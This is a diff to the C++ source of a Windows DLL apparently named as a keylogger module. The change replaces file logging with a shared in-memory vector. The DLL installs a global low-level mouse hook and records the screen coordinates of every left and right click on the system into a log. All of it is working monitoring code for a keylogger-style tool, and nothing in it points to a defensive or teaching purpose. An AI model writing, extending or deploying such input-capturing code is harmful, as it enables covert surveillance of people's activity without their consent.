@@ -1,40 +1,27 @@
 //cl /EHsc /LD .\keylog_m_lib.cpp /link User32.lib
 #include <Windows.h>
-#include <fstream>
 #include <mutex>
-#include <codecvt>
-#include <string.h>
+#include <string>
+#include <vector>
+#include <sstream>
 #define DLL_EXPORT __declspec(dllexport)
 ///////////////////////////////////////////////////////////////////////
 HHOOK mouseHook;
-
-std::ofstream outputFile;
+std::vector<std::string>* sharedLogVector = nullptr;
 std::mutex logMutex;
 ///////////////////////////////////////////////////////////////////////
-
 LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
-
 ///////////////////////////////////////////////////////////////////////
 
-DLL_EXPORT void Initialize(const std::string& filename)
+DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-
-    {
-        std::lock_guard<std::mutex> lock(logMutex);
-        outputFile.open(filename, std::ios::app);
-    }
-
+    sharedLogVector = logVector;
     mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
 }
 
-DLL_EXPORT void Cleanup(const std::string& filename)
+DLL_EXPORT void Cleanup()
 {
     if (mouseHook) UnhookWindowsHookEx(mouseHook);
-
-    {
-        std::lock_guard<std::mutex> lock(logMutex);
-        outputFile.close();
-    }
 }
 
 LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -49,16 +36,24 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
         {
             case WM_LBUTTONDOWN:
             {
-                //std::wcout << L"\n[Left click (" << x << L", " << y << L")]\n";
-                outputFile <<"\n[Left click("<< x <<", "<< y << ")]\n";
-                outputFile.flush();
+                std::ostringstream oss;
+                oss << x << " , " << y;
+                std::string entry = "\n[Left click( " + oss.str() + " )]\n";
+                {
+                    std::lock_guard<std::mutex> lock(logMutex);
+                    sharedLogVector->emplace_back(entry);
+                }
                 break;
             }
             case WM_RBUTTONDOWN:
             {
-                //std::wcout << L"\n[Right click (" << x << L", " << y << L")]\n";
-                outputFile <<"\n[Right click("<< x <<", "<< y << ")]\n";
-                outputFile.flush();
+                std::ostringstream oss;
+                oss << x << " , " << y;
+                std::string entry = "\n[Right click( " + oss.str() + " )]\n";
+                {
+                    std::lock_guard<std::mutex> lock(logMutex);
+                    sharedLogVector->emplace_back(entry);
+                }
                 break;
             }
         }
